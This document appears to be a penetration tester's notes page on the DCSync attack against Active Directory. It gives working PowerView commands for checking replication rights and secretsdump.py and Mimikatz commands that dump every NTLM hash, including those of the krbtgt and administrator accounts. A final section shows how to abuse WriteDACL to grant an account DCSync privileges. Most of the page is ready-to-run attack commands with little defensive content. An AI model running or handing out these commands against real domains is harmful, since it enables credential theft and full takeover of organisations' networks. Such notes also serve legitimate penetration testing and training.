---
description: Syncing into full domain compomise
---

# DCSync

{% embed url="https://www.youtube.com/watch?ab_channel=Netwrix&v=_m3u13Df7Fc" %}
Hard to prevent and detec.
{% endembed %}

### What is a DCSync attack

DCSync is a attack for stealing the Active Directory password database by using the Directory Replication Service Remote Protocol. This allows an attacker to mimic a Domain Controller to retrieve all the user NTLM password hashes.

To perfrom this attack you need the rights:

* Replicating Directory Changes
* Replciating Directory Changes all

<figure><img src="broken-reference" alt=""><figcaption><p>Its commond to find these right enabled.</p></figcaption></figure>

#### Use powershell to check for Replication rights

First retrieve the user's SID and then use Get-ObjectAcl to check or Replication rights

```shell
Get-DomainUser -Identity mczen  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=zencorp,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Returns
AceQualifier          : AccessAllowed
ObjectDN              : DC=ZENCORP,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=ZENCORP,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All
```

### The DCSync attack

DCSync replication can be done by several tools. Runnings these tools and performing the DCSync attack will result in extracting NTLM hashes.

#### Secretsdump

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

* `-just-dc-ntlm` for NTLM hashes only
* `just-dc` for NTLM, Kerberos and cleartext
* -j`ust-dc-user` username for specific user
* `history` for password history
* `-pwd-last-set` password last changes

#### Mimikatz

When using Mimikatz we have to target a user and must ben run by the user who has the DCSync privileges.

```powershell
# Using mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Using mimikatz.exe
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:ZENCORP.LOCAL /user:ZENCORP\administrator

# Or target the krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### <mark style="color:yellow;">WriteDACL</mark>

The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges.

* ACL: Acces Control Lists defines who has access to which asset or resource.
* ACE: Acces Control Entries stores ACL settings.
* Security principal: Entity to which ACE applies, like users, group or process.

Using powershell we can use these WriteDACL rights to add DCSync privileges to an aacount.

```powershell
# Create credential object
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

# Add DCSynce privilgess
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```
